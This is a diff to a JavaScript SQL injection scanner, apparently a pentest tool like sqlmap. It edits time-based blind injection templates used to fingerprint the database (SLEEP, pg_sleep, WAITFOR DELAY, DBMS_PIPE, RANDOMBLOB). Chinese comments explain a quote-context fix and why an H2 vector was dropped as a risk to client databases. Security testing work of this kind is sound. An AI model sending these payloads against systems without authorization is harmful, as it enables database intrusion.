@@ -377,22 +377,38 @@ export function dbmsFromError(text) {
 // dbms 未知时由 DBFingerprinter 按高频库顺序注入观测耗时辅助定库，命中（响应耗时超阈值）即停。
 // {SLEEP} 用短时长（秒）以降低探测成本；SQLite 无原生 sleep，用 LIKE(大块 HEX(RANDOMBLOB)) 重运算近似延迟（与 sqlmap 同思路）。
 // 顺序即优先级（高频库在前，命中即停，避免请求爆炸）。
+//
+// [CTX-FIX 2026-09-18] 每条向量都必须带 `{BD}`（= 该注入点已探到的闭合前缀），模板里**不再写死引号**。
+// 原实现的引号是逐条硬编码的：MySQL/PG/Oracle/SQLite 不带引号（只适用于数值上下文），
+// ClickHouse/Sybase/H2/MonetDB 带 `'`（只适用于字符串上下文）—— 于是向量顺序在非数值上下文上被打乱：
+// 真 MySQL 的字符串点上，MySQL 向量整条落进 `'%...%'` 字面量内 → 不延时 → 继续往下；
+// 第 6 位的 ClickHouse 向量靠自带的 `'` 闭合成功 → MySQL 真的睡了 1 秒 → **定库 ClickHouse**。
+// 后果不是"报告里写错一个词"：payload 族、注释符、报错模板、提取语句全部按错方言选。
+// 实测（blackbox-lab 真 MySQL 8.0.28，2026-09-18）A2-string / A3-like 均判成 ClickHouse，
+// 且 A3-like 唯一技术位是 time —— 它正是蹭这次误判才命中的。
 export const TIME_VECTORS = [
-  { dbms: 'MySQL', payload: '{ORIG} AND SLEEP({SLEEP})-- -' },
-  { dbms: 'PostgreSQL', payload: '{ORIG} AND pg_sleep({SLEEP})-- -' },
-  { dbms: 'SQL Server', payload: "{ORIG}; WAITFOR DELAY '0:0:{SLEEP}'-- -" },
-  { dbms: 'Oracle', payload: "{ORIG} AND DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP})=0-- -" },
+  { dbms: 'MySQL', payload: '{ORIG}{BD} AND SLEEP({SLEEP})-- -' },
+  { dbms: 'PostgreSQL', payload: '{ORIG}{BD} AND pg_sleep({SLEEP})-- -' },
+  { dbms: 'SQL Server', payload: "{ORIG}{BD}; WAITFOR DELAY '0:0:{SLEEP}'-- -" },
+  { dbms: 'Oracle', payload: "{ORIG}{BD} AND DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP})=0-- -" },
   // [P1 批次 2026-09-08] SQLite 向量夹上限：RANDOMBLOB 上限 5MB（原 {SLEEP} 线性放大在
   // {SLEEP}=3+ 时达 15MB+，低端目标 CPU 重运算可 >10s 熔断超时）。MIN 夹顶不降基准：
   // {SLEEP}=1（指纹默认）仍为 5MB 与历史一致，零检出回归。超时由 sendInjection 的
   // timeoutMs 天然熔断（失败返回 null → 跳过该向量）。
-  { dbms: 'SQLite', payload: "{ORIG} AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(MIN(({SLEEP}*5000000),5000000)))))-- -" },
+  { dbms: 'SQLite', payload: "{ORIG}{BD} AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(MIN(({SLEEP}*5000000),5000000)))))-- -" },
   // [⑯] 补全时间向量：ClickHouse sleep() + Sybase WAITFOR DELAY（语句级，需堆叠分号）
-  { dbms: 'ClickHouse', payload: '{ORIG}\' AND sleep({SLEEP})=0-- -' },
-  { dbms: 'Sybase', payload: "{ORIG}'; WAITFOR DELAY '0:0:{SLEEP}'-- -" },
-  // [P1] 补全时间向量：H2 SLEEP(ms)（{SLEEP}000 秒→毫秒）+ MonetDB sys.sleep(sec)
-  { dbms: 'H2', payload: "{ORIG}' AND SLEEP({SLEEP}000)=0-- -" },
-  { dbms: 'MonetDB', payload: "{ORIG}' AND (CASE WHEN 1=1 THEN sys.sleep({SLEEP}) ELSE 0 END) IS NOT NULL-- -" },
+  { dbms: 'ClickHouse', payload: '{ORIG}{BD} AND sleep({SLEEP})=0-- -' },
+  { dbms: 'Sybase', payload: "{ORIG}{BD}; WAITFOR DELAY '0:0:{SLEEP}'-- -" },
+  // [P1] MonetDB sys.sleep(sec)
+  { dbms: 'MonetDB', payload: "{ORIG}{BD} AND (CASE WHEN 1=1 THEN sys.sleep({SLEEP}) ELSE 0 END) IS NOT NULL-- -" },
+  // [UNIT-TRAP 2026-09-18] **H2 不放进盲探时间向量**（原条目 `{ORIG} AND SLEEP({SLEEP}000)=0` 已删）。
+  // 理由不是命中率，是「我们会对客户的库做什么」：H2 的 SLEEP 以**毫秒**计、MySQL 的同名函数以
+  // **秒**计，同一条 SQL 在两边差 1000 倍。给 `{BD}` 之后这条在数值上下文的 MySQL 上完全合法，
+  // 一旦排在前面的 MySQL 向量因故没延时（例如 WAF 正好拦了 `SLEEP(1)` 而没拦 `SLEEP(1000)=0`），
+  // 就是让目标库**睡 1000~15000 秒**——客户端连接池被我们自己占死，属于事故级自伤。
+  // 单位不对称无法用任何表达式同时满足两边，因此 H2 定库改由**报错签名**承担
+  // （`org.h2.jdbc` / "Syntax error in SQL statement" 已在 ERROR_SIG_BY_DBMS；
+  // 真 JDBC H2 的验证见 e2e/multi-engine-lab）。
 ];
 
 // 跨库通用"存储探针"（未知 dbms 时回退；已知 dbms 优先用 PAYLOADS[dbms].error）。
@@ -554,7 +570,8 @@ export function capHeavyFunctions(filled) {
 /**
  * 填充 payload 模板中的占位符
  * @param {string} template 含占位符的模板
- * @param {{orig?: string, sleep?: number, num?: number, sep?: string}} vars 占位符值
+ * @param {{orig?: string, sleep?: number, num?: number, sep?: string, bd?: string}} vars 占位符值
+ *   `bd` = 该注入点的闭合前缀（boundary），供需要跨上下文使用的向量（见 TIME_VECTORS）拼接
  * @returns {string} 填充后的 payload
  */
 export function fillPayload(template, vars = {}) {
@@ -562,6 +579,7 @@ export function fillPayload(template, vars = {}) {
   return capHeavyFunctions(
     template
       .replaceAll('{ORIG}', v.orig ?? '')
+      .replaceAll('{BD}', v.bd ?? '')
       .replaceAll('{SLEEP}', String(v.sleep ?? 1))
       .replaceAll('{NUM}', String(v.num ?? Math.floor(Math.random() * 9000) + 1000))
       .replaceAll('{SEP}', v.sep ?? '-- -')
